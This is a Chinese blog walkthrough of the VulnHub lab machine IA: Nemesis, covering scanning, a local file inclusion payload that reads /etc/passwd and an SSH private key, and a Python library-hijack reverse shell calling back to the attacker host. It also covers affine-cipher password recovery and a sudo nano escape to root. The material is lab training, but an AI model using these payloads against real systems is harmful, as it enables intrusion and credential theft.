> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/s6yuVLsHLko_72xKq_KmDA)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 32篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/ZSH4VlHv0wUiapfR49hWa2eYqkEGbXzkuQ59LbkL2CvAM8l6ZgoEquXibP2LqGdBhxIemS84Jl7iaVqDK9CJXVdCw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/yy4ERibNaTfR1a65O0rmnQbpic6doaYJJDItNsfQWUBHsSJxn4TiaWOOnaB9CBdo2L7YUk8g2UpelUrQORCeDHHbw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**声明：**文章来自作者日常学习笔记，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。仅供学习研究

![图片](https://mmbiz.qpic.cn/mmbiz_png/h6R0sRed4WF1Y7qVdRo7SibsRyCm88BjClJeIRVfaBH4LP84hq6VjWz5JKiadnZcuqTUwCVcHoSHlWr6o4X24Oxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HIvUXxmO2Igh1vy0Tiayxpn8jT7aGK2bPrl3vib0GUP2bnEpNQz2HB37ic3E1HX3mNjyDOqAP15IHgGibZZxtib5VhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

靶机信息  

-------

下载地址:

```
https://www.vulnhub.com/entry/ia-nemesis-101,582/
```

靶场: VulnHub.com

靶机名称: IA: Nemesis (1.0.1)

难度: 中等-困难

发布时间: 2020年10月25日

提示信息:

```
无
```

目标: flag1.txt、flag2.txt、/root/root.txt

  

实验环境
----

```
`攻击机:VMware  kali    192.168.7.3``靶机:Vbox     linux   IP自动获取`
```

信息收集  

-------

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 192.168.7.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到主机地址为192.168.7.166

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 192.168.7.166 -oN Nemesis.nmap
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到3个开放端口，其中80（http）52845（http）、52846（SSH），先访问80端口

Web渗透
-----

```
http://192.168.7.166
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

打开首页后有一些提示，告诉网站管理员存在漏洞需要修复，先做个目录扫描

### 目录扫描

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.7.166 -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到contact.php和robots.txt，把robots.txt下载下来看看有什么

```
`wget http://192.168.7.166/robots.txt``cat robots.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提示让我们去找真正的漏洞，再来看看contact.php是什么

```
http://192.168.7.166/contact.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

一个正常的页面，在源码中找到一些提示

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

一段php代码，获取3个参数回显1个，我们试试

```
`http://192.168.7.166/contact.php?name=a&email=b&message=ls``http://192.168.7.166/contact.php?name=a&email=b&message=../../../../etc/passwd`
```

没有回显任何信息，可能注入点不在这里。在login.html页面源码中找到一些信息

```
http://192.168.7.166/login.html
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

感觉是用户名密码之类的东西先记下来，还有一个页面thanoscarlos.html访问看看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

没什么有用信息，访问52845端口

```
http://192.168.7.166:52845
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

访问后是一个html5制作的网站，在Contact Us中发现一些内容跟之前的contact.php页面的提示很像

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

同样是3个参数，我们试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提交后弹出保存到文件中，跟文件有关，可能是文件包含，再试试

### 本地文件包含漏洞

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提交后返回了passwd文件内容，到源码里看一下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

两个用户有登录权限，下面的这个thanos与前面login.html页面上显示的是同一个那hacker_in_the_town会不会是密码，SSH登录试一下（这里漏了1个

```
ssh thanos@192.168.7.166 -p 52846
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

是用公钥登录的 ，试试能不能读取thanos用户目录下的公钥

payload

```
message=../../../../home/thanos/.ssh/id_rsa&submit=
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

成功读取公钥文件，把他保存下来，再来登录试试

```
ssh thanos@192.168.7.166 -p 52846 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

查看用户目录下有什么

```
`ls -al``cat flag1.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

找到一个备份用的python脚本和flag1.txt，再来看下backup.py的内容

```
cat backup.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

这个脚本将/var/www/html目录备份到/tmp/website.zip

home目录下还有一个carlos用户目录，访问时提示没权限，找找提权信息

执行sudo -l 时确认hacker_in_the_town不是thanos的密码，suid也没有权限，上传pspy64

kali攻击机上开户http服务

```
python3 -m http.server
```

靶机上下载pspy64

```
wget http://192.168.7.3:8000/pspy64
```

pspy64加上执行权限并运行

```
`chmod +x pspy64``./pspy64`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以看到UID1000的用户每分钟便执行一次backup.py脚本

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这个UID就是carlos用户，我们可以利用这个脚本提权,再来看一下脚本

```
cat backup.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

这里引用了zipfile，我们可以在backup.py文件的目录下创建一个zipfile.py文件

kali攻击上操作

先监听4444端口

```
nc -lvvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

再创建zipfile.py文件

```
`import socket,subprocess,os``s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)``s.connect(("192.168.7.3",4444))``os.dup2(s.fileno(),0)``os.dup2(s.fileno(),1)``os.dup2(s.fileno(),2)``p=subprocess.call(["/bin/sh","-i"])`
```

开启http服务

```
python3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

靶机上下载zipfile.py文件

```
wget http://192.168.7.3:8000/zipfile.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

稍等一会靶机上便会自动执行backup.py脚本

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，切换成交互式shell

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm``Ctrl+z快捷键``stty -a``stty raw -echo;fg``reset`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

切换完成，查看carlos用户目录下有什么

```
ls -al
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

查看flag2.txt

```
cat flag2.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到第2个flag,再查看root.txt

```
cat root.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

提示中讲到carlos用户的密码已被加密，加密的代码存储在encrypt.py文件中，让我们破解加密内容，格式为

```
************FUN********
```

那我们先来看看encrypt.py脚本里是什么内容

```
cat encrypt.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

通过脚本可以看到是通过affine encrypt加密的，

```
FAJSRWOXLAXDQZAWNDDVLSU
```

我们到dcode.fr解一下,使用这个网站要注意一下，一定要等全部加载完才能使用，不然会操作失败

```
https://www.dcode.fr/chiffre-affine
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

左侧便是解出来的内容，我们按照之前给的提示规则![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)对比一下ENCRYPTIONISFUNPASSWORD比较符合密码规则

我们用这个密码执行下sudo 命令

```
`sudo -l``输入密码ENCRYPTIONISFUNPASSWORD`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

密码正确，找到nano使用root用户运行不需要密码

```
`sudo /bin/nano /opt/priv``Ctrl + r``Ctrl + x``reset; sh 1>&0 2>&0`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Ctrl + r

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Ctrl + x

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

输入reset; sh 1>&0 2>&0

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

输入后执行完画面没有任何反应，其实已经提权成功了，此时输入id再回车就能看到回显

```
id
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

看起来有点不舒服，用python切换成交互shell

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm``cd /root``ls`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
cat root.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)